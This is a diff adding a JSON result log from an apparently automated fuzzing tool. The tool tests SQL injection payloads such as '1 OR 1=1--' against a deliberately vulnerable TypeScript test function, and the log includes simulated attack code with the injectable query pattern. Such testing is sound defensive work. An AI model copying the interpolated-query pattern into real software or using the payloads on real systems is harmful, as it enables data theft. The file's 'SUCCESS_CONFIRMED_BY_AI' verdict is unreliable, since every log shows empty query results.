@@ -1,0 +1,59 @@
+{
+  "status": "SUCCESS_CONFIRMED_BY_AI",
+  "successful_payload": "1 OR 1=1--",
+  "attempts": [
+    {
+      "payload": "1 OR 1=1--",
+      "timestamp": "2025-10-24T19:56:33.366411",
+      "is_successful": true,
+      "execution_log": "Executing query: SELECT * FROM users WHERE id = 1 OR 1=1--\nQuery results: []\n\nFuzzing completed!\nTotal executions: 1\nUnique crashes: 0\nCurrent cov    : 66.67%\nMax coverage   : 66.67%\n[INFO] - 발견된 JavaScript 파일: 1개\n  - P_TARGET/P_sql-injection_30064771275.js\n\n대화형 퍼징 시작: P_TARGET/P_sql-injection_30064771275.js\nCtrl+C로 종료할 수 있습니다.\n",
+      "analysis_reason": "Execution successful with no stderr and no new crashes.",
+      "simulated_code": "function vulnerableQuery(userId: string) {\n    // SQL Injection vulnerability\n    const query = `SELECT * FROM users WHERE id = ${userId}`;\n    console.log(`Executing query: ${query}`);\n    db.all(query, [], (err, rows) => {\n        if (err) {\n            throw err;\n        }\n        console.log('Query results:', rows);\n    });\n}\n\n// Simulating attack\nvulnerableQuery('1 OR 1=1--');",
+      "coverage_percent": 66.67
+    },
+    {
+      "payload": "1 OR 1=1;--",
+      "timestamp": "2025-10-24T19:56:35.196585",
+      "is_successful": true,
+      "execution_log": "Executing query: SELECT * FROM users WHERE id = 1 OR 1=1;--\nQuery results: []\n\nFuzzing completed!\nTotal executions: 1\nUnique crashes: 0\nCurrent cov    : 66.67%\nMax coverage   : 66.67%\n[INFO] - 발견된 JavaScript 파일: 1개\n  - P_TARGET/P_sql-injection_30064771275.js\n\n대화형 퍼징 시작: P_TARGET/P_sql-injection_30064771275.js\nCtrl+C로 종료할 수 있습니다.\n",
+      "analysis_reason": "Execution successful with no stderr and no new crashes.",
+      "simulated_code": "function vulnerableQuery(userId: string) {\n    // SQL Injection vulnerability\n    const query = `SELECT * FROM users WHERE id = ${userId}`;\n    console.log(`Executing query: ${query}`);\n    db.all(query, [], (err, rows) => {\n        if (err) {\n            throw err;\n        }\n        console.log('Query results:', rows);\n    });\n}\n\n// Simulated attack\nvulnerableQuery('1 OR 1=1;--');",
+      "coverage_percent": 66.67
+    },
+    {
+      "payload": "1 OR 1=1 --",
+      "timestamp": "2025-10-24T19:56:41.949890",
+      "is_successful": true,
+      "execution_log": "Executing query: SELECT * FROM users WHERE id = 1 OR 1=1 --\nQuery results: []\n\nFuzzing completed!\nTotal executions: 1\nUnique crashes: 0\nCurrent cov    : 66.67%\nMax coverage   : 66.67%\n[INFO] - 발견된 JavaScript 파일: 1개\n  - P_TARGET/P_sql-injection_30064771275.js\n\n대화형 퍼징 시작: P_TARGET/P_sql-injection_30064771275.js\nCtrl+C로 종료할 수 있습니다.\n",
+      "analysis_reason": "Execution successful with no stderr and no new crashes.",
+      "simulated_code": "\nconst sqlite3 = require('sqlite3').verbose();\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n    db.run(\"CREATE TABLE users (id INT, name TEXT)\");\n    db.run(\"INSERT INTO users (id, name) VALUES (1, 'Alice')\");\n    db.run(\"INSERT INTO users (id, name) VALUES (2, 'Bob')\");\n\n    function vulnerableQuery(userId) {\n        // SQL Injection vulnerability\n        const query = `SELECT * FROM users WHERE id = ${userId}`;\n        console.log(`Executing query: ${query}`);\n        db.all(query, [], (err, rows) => {\n            if (err) {\n                throw err;\n            }\n            console.log('Query results:', rows);\n        });\n    }\n\n    // Simulating attack\n    const maliciousInput = \"1 OR 1=1 --\";\n    vulnerableQuery(maliciousInput);\n});\n\ndb.close();\n",
+      "coverage_percent": 66.67
+    },
+    {
+      "payload": "1 OR 1=1--",
+      "timestamp": "2025-10-24T19:56:46.644265",
+      "is_successful": true,
+      "execution_log": "Executing query: SELECT * FROM users WHERE id = 1 OR 1=1--\nQuery results: []\n\nFuzzing completed!\nTotal executions: 1\nUnique crashes: 0\nCurrent cov    : 66.67%\nMax coverage   : 66.67%\n[INFO] - 발견된 JavaScript 파일: 1개\n  - P_TARGET/P_sql-injection_30064771275.js\n\n대화형 퍼징 시작: P_TARGET/P_sql-injection_30064771275.js\nCtrl+C로 종료할 수 있습니다.\n",
+      "analysis_reason": "Execution successful with no stderr and no new crashes.",
+      "simulated_code": "function vulnerableQuery(userId) {\n    // SQL Injection vulnerability\n    const query = `SELECT * FROM users WHERE id = ${userId}`;\n    console.log(`Executing query: ${query}`);\n    db.all(query, [], (err, rows) => {\n        if (err) {\n            throw err;\n        }\n        console.log('Query results:', rows);\n    });\n}\n\n// Simulated attack\nvulnerableQuery('1 OR 1=1--');",
+      "coverage_percent": 66.67
+    }
+  ],
+  "vulnerability_context": {
+    "project": "sql-injection",
+    "language": "typescript",
+    "file_path": "vul_test/src/sql-injection.ts",
+    "function_name": "vulnerableQuery",
+    "sink": "all",
+    "sink_id": "30064771275",
+    "known_weakness": [
+      "SQL Injection"
+    ],
+    "code_context": {
+      "before": "function vulnerableQuery(userId: string) {\n    // SQL Injection vulnerability\n    const query = `SELECT * FROM users WHERE id = ${userId}`;\n    console.log(`Executing query: ${query}`);\n    db.all(query, [], (err, rows) => {\n        if (err) {\n            throw err;\n        }\n        console.log('Query results:', rows);\n    });\n}",
+      "sinkLine": "db.all(query, [], (err, rows) => {\n        if (err) {\n            throw err;\n        }\n        console.log('Query results:', rows);\n    })",
+      "after": "",
+      "pseudocode": "function vulnerableQuery(userId) {\n    const query = `SELECT * FROM users WHERE id = ${userId}`;\n    console.log(`Executing query: ${query}`);\n    db.all(query, [], (err, rows) => {\n        if (err) {\n            throw err;\n        }\n        console.log('Query results:', rows);\n    });\n}\n\nmodule.exports = {\n    vulnerableQuery\n};"
+    }
+  }
+}
